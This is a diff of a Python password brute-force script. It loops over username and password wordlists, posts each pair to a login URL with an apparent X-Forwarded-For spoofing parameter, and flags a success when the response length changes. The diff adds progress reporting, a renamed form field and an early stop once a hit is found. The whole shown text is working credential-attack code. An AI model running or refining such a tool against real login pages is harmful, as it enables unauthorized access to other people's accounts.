@@ -22,12 +22,16 @@ def brute_force(url, xff_ip, username_file, password_file, timeout=5):
         print(f"not found file {e.filename}")
         return
 
+    total = len(usernames) * len(passwords)
+    done = 0
+
     print(f"[+] loaded {len(usernames)}/{len(passwords)}")
+    print(f"[+] total combinations: {total}")
     print("[+] starting bruteforce")
 
     for user in usernames:
         for pwd in passwords:
-            data = {"username": user, "password": pwd}
+            data = {"user": user, "password": pwd}
 
             try:
                 response = requests.post(
@@ -41,10 +45,18 @@ def brute_force(url, xff_ip, username_file, password_file, timeout=5):
                     print("200")
                 if len(response.text) != 1770:
                     print(f"not 1770: {user}/{pwd}")
+                    return
             except requests.exceptions.RequestException as e:
                 print(f"error: {e}")
+            finally:
+                # 현재 진행도를 "완료/전체" 형식으로 표시
+                done += 1
+                pct = (done / total) * 100 if total else 0
+                print(
+                    f"\r[-] progress: {done}/{total} ({pct:.1f}%)", end="", flush=True
+                )
 
-    print("[-] bruteforce finished")
+    print(f"\n[-] bruteforce finished")
 
 
 def parse_args():
